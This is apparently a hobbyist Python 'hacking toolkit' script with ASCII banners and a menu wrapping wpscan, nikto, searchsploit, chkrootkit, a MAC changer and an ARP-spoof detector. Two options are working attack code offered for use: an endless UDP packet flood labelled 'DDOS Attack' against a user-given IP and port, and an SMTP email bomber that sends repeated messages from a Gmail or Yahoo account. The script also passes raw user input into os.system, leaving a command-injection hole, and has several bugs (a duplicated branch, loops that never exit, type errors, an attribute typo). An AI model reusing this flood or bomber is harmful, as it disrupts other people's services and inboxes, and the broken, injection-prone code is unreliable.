import os 
import time
import socket
import random
from requests import get
import json
import  sys
import smtplib
import getpass
import scapy.all as scapy

banner = """
/   _____/  | ______   ____  __________________   
 \_____  \|  |/ /  _ \ / ___\/  ___/\_  __ \__  \  
 /        \    <  <_> ) /_/  >___ \  |  | \// __ \_
/_______  /__|_ \____/\___  /____  > |__|  (____  /
        \/     \/    /_____/     \/             \/

"""
banner2 = """
   _____                  _________ .__                                        
  /     \ _____    ____   \_   ___ \|  |__ _____    ____    ____   ___________ 
 /  \ /  \\__  \ _/ ___\  /    \  \/|  |  \\__  \  /    \  / ___\_/ __ \_  __ \
/    Y    \/ __ \\  \___  \     \___|   Y  \/ __ \|   |  \/ /_/  >  ___/|  | \/
\____|__  (____  /\___  >  \______  /___|  (____  /___|  /\___  / \___  >__|   
        \/     \/     \/          \/     \/     \/     \//_____/      \/      

"""

banner3 = """
   _____                  _________ .__                                        
  /     \ _____    ____   \_   ___ \|  |__ _____    ____    ____   ___________ 
 /  \ /  \\__  \ _/ ___\  /    \  \/|  |  \\__  \  /    \  / ___\_/ __ \_  __ \
/    Y    \/ __ \\  \___  \     \___|   Y  \/ __ \|   |  \/ /_/  >  ___/|  | \/
\____|__  (____  /\___  >  \______  /___|  (____  /___|  /\___  / \___  >__|   
        \/     \/     \/          \/     \/     \/     \//_____/      \/      

"""
banner4 = """
 __      __                .___                                    _________                                         
/  \    /  \___________  __| _/____________   ____   ______ ______/   _____/ ____ _____    ____   ____   ___________ 
\   \/\/   /  _ \_  __ \/ __ |\____ \_  __ \_/ __ \ /  ___//  ___/\_____  \_/ ___\\__  \  /    \ /    \_/ __ \_  __ \
 \        (  <_> )  | \/ /_/ ||  |_> >  | \/\  ___/ \___ \ \___ \ /        \  \___ / __ \|   |  \   |  \  ___/|  | \/
  \__/\  / \____/|__|  \____ ||   __/|__|    \___  >____  >____  >_______  /\___  >____  /___|  /___|  /\___  >__|   
       \/                   \/|__|               \/     \/     \/        \/     \/     \/     \/     \/     \/      

"""
banner5 = """
            .__                            ___.   .__.__  .__  __                                               
___  ____ __|  |   ____   ________________ \_ |__ |__|  | |__|/  |_ ___.__.   ______ ____ _____    ____   ____  
\  \/ /  |  \  |  /    \_/ __ \_  __ \__  \ | __ \|  |  | |  \   __<   |  |  /  ___// ___\\__  \  /    \ /    \ 
 \   /|  |  /  |_|   |  \  ___/|  | \// __ \| \_\ \  |  |_|  ||  |  \___  |  \___ \\  \___ / __ \|   |  \   |  \
  \_/ |____/|____/___|  /\___  >__|  (____  /___  /__|____/__||__|  / ____| /____  >\___  >____  /___|  /___|  /
                      \/     \/           \/    \/                  \/           \/     \/     \/     \/

"""
banner6 = """
___________              .__         .__  __      _________                     
\_   _____/__  _________ |  |   ____ |__|/  |_   /   _____/ ____ _____    ____  
 |    __)_\  \/  /\____ \|  |  /  _ \|  \   __\  \_____  \_/ ___\\__  \  /    \ 
 |        \>    < |  |_> >  |_(  <_> )  ||  |    /        \  \___ / __ \|   |  \
/_______  /__/\_ \|   __/|____/\____/|__||__|   /_______  /\___  >____  /___|  /
        \/      \/|__|                                  \/     \/     \/     \/
"""
banner7 = """
________  ________   ________    _________
\______ \ \______ \  \_____  \  /   _____/
 |    |  \ |    |  \  /   |   \ \_____  \ 
 |    `   \|    `   \/    |    \/        \
/_______  /_______  /\_______  /_______  /
        \/        \/         \/        \/ 
"""
banner8 = """
              .__.__    ___.                 ___.   .__                
  _____ _____  |__|  |   \_ |__   ____   _____\_ |__ |__| ____    ____  
 /     \\__  \ |  |  |    | __ \ /  _ \ /     \| __ \|  |/    \  / ___\ 
|  Y Y  \/ __ \|  |  |__  | \_\ (  <_> )  Y Y  \ \_\ \  |   |  \/ /_/  >
|__|_|  (____  /__|____/  |___  /\____/|__|_|  /___  /__|___|  /\___  / 
      \/     \/               \/             \/    \/        \//_____/  
                                                                        
                                                                      
"""

banner9 = """
                                          _____  _____      .___      __                 __   
_____ _____________  ____________   _____/ ____\/ ____\   __| _/_____/  |_  ____   _____/  |_ 
\__  \\_  __ \____ \/  ___/\____ \ /  _ \   __\\   __\   / __ |/ __ \   __\/ __ \_/ ___\   __\
 / __ \|  | \/  |_> >___ \ |  |_> >  <_> )  |   |  |    / /_/ \  ___/|  | \  ___/\  \___|  |  
(____  /__|  |   __/____  >|   __/ \____/|__|   |__|    \____ |\___  >__|  \___  >\___  >__|  
     \/      |__|       \/ |__|                              \/    \/          \/     \/     

"""
print(banner)
time.sleep(1)
things = """
1- Press 1 for MAC changer.
2- Press 2 for ROOTKIT Scanner
3- Press 3 for Wordpress Scanner.
4- Press 4 for vulnerability scanning.
5- Press 5 for Exploit Scanner.
6- Press 6 for DDOS Attack.
7- Press 7 for Email Bombing.
8- Press 8 for ArpSpoof Detection.
6- Press q for quit.
"""
print(things)
time.sleep(1)
ans = input("Please enter what you want to choose: ")

while (True):
    if ans == "1":
        print(banner2)
        os.system("apt-get install figlet")
        os.system("clear")
        os.system("figlet BHECY")
        os.system("figlet MAC ID CHANGER ")



        rox=input("Network adapter name : ")
        os.system("ifconfig "+rox+" "+"down")
        os.system("macchanger -r "+rox)
        os.system("ifconfig "+rox+" "+"up")

        print("\033[92mMac id is changed.")
        break
    
    elif ans == "2":
        
        print(banner3)
        os.system("apt-get install figlet")
        os.system("clear")
        os.system("figlet BHECY")
        os.system("figlet ROOTKIT SCANNER")
        os.system("chkrootkit")
        break

    elif ans == "3":

        print(banner4)
        os.system("apt-get install figlet")
        os.system("clear")
        os.system("figlet BHECY")
        os.system("figlet WORDPRESS SCANNER")

        rux = """
        Welcome...
        1) Quick Scan
        2) Attachment Scan
        3) Theme Scan
        4) Admin Username Scan
        """
        print(rux)

        rox = input("Enter transaction number : ")

        if rox=="1":
	        site=input("site address : ")
	        os.system("wpscan --url "+site)
        elif rox=="2":
	        site=input("site address : ")
	        os.system("wpscan --url "+site+" --enumerate p")
        elif rox=="3":
	        site=input("site address : ")
	        os.system("wpscan --url "+site+" --enumerate t")
        elif rox=="2":
	        site=input("site address : ")
	        os.system("wpscan --url "+site+" --enumerate u")
        else:
	        print("the value you entered does not have any equivalent")
        break
    elif ans == "4":
        print(banner5)
        time.sleep(1)
        os.system("apt-get install figlet")
        os.system("clear")
        os.system("figlet BHECY")
        os.system("figlet ZAAFİYET ANALİZİ")
        ipadd = input("Enter ip address : ")
        os.system("nikto -h "+ipadd)
    elif ans == "5":
        print(banner6)
        os.system("apt-get install figlet")
        os.system("clear")
        os.system("figlet BHECY")
        os.system("figlet EXPLOIT SCAN")


 
        rex = input("Key word - : ")
        os.system("searchsploit "+rex)

    elif ans == "q":
        time.sleep(1)
        print("Thank you for choosing us")
    elif ans == "6":
        print(banner7)
        def get_ips_for_host(host):
            try:
                ips = socket.gethostbyname_ex(host)
            except socket.gaierror:
                ips=[]
            return ips
        ips = get_ips_for_host('www.google.com')
        print(repr(ips))
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        print(f"Your Hostname: {hostname}")
        print(f"Your IP Address: {ip_address}")


        target_ip = input("Target ip address Exp(193.10.233.344) = ")
     
        target_port = int(input("Target Port: "))

        byte = random._urandom(3000)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        how_many_packages_did_we_send = 0

        while  True:
            s.sendto(byte,(target_ip,target_port))

            how_many_packages_did_we_send += 1
            print("Attack stated! ,Package send=")
            print(how_many_packages_did_we_send)
    elif ans == "7":
        print(banner8)
        print("In this code hacktoolspack I got help")
        srv = input ('MailServer Gmail/Yahoo: ')
        user = input('Email: ')
        passwd = getpass.getpass('Password: ')


        to = input('\nTo: ')
        body = input('Message: ')
        total = input('Number of send: ')

        if srv == 'gmail':
            smtp_server = 'smtp.gmail.com'
            port = 587
        elif srv == 'yahoo':
            smtp_server = 'smtp.mail.yahoo.com'
            port = 25
        else:
            print ('Applies only to gmail and yahoo.')
            sys.exit()

        try:
            srv = smtplib.SMTP(smtp_server,port) 
            srv.ehlo()
            if srv == "smtp.gmail.com":
                srv.starttls()
            srv.login(user,passwd)
            for i in range(1, total+1):
                subject = os.urandom(9)
                msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
                srv.sendmail(user,to,msg)
                print ("\rE-mails sent: %i" % i)
                sys.stdout.flush()
            srv.quit()
            print ('\n Done !!!')
        except KeyboardInterrupt:
            print ('[-] Canceled')
            sys.exit()
        except smtplib.SMTPAuthenticationError:
            print ('\n[!] The username or password you entered is incorrect.')
            sys.exit()
    elif ans == "8":
        print(banner9)
        def get_mac(ip):
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
            return answered_list[0][1].hwsrc

        def sniff(interface):
            scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
        
        def process_sniffed_packet(packet):
            if packet.haslayer(scapy.ARP) and packet[scapy.ARP].op == 2:
                try:
                    real_mac = get_mac(packet[scapy.ARP].psrc)
                    response_mac = packet[scapy.ARP].hwsre

                    if real_mac != response_mac:
                        print("[+] You are under arpspoof attack.")
                except IndexError:
                    print("İndex error")
        sniff("eth0")
    else:
        print("There is nothing suitable for your entry")
        time.sleep(1)
        print("Automatically quiting")
        break
